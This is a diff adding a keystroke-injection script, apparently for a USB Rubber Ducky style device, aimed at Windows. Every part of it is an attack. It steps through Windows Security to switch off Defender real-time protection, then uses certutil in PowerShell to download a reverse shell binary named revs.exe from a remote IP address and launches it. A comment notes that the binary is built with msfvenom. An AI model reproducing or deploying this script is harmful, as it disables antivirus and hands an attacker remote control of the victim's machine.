@@ -1,0 +1,43 @@
+REM ***********************************************
+REM *** Disable defender - real time protection ***
+REM ***********************************************
+DELAY 1000
+CTRL ESC
+DELAY 300
+STRING windows security
+DELAY 300
+ENTER
+DELAY 1000
+ENTER
+TAB
+TAB
+TAB
+TAB
+DELAY 300
+ENTER
+DELAY 600
+SPACE
+DELAY 600
+LEFT
+ENTER
+DELAY 300
+ALT F4
+REM ********************************************
+REM *** Downloading the reverse shell binary ***
+REM ********************************************
+REM "to execute the reverse shell payload u need to generate tha binary with msfvenom"
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell certutil.exe -urlcache -f http://192.168.118.131/revs.exe C:\Windows\Temp\revs.exe 
+ENTER
+DELAY 1000
+REM ***********************************
+REM *** Execute the revs.exe binary ***
+REM ***********************************
+GUI r
+DELAY 100
+STRING powershell Start-Process -FilePath "C:\Windows\Temp\revs.exe"
+ENTER
+
+
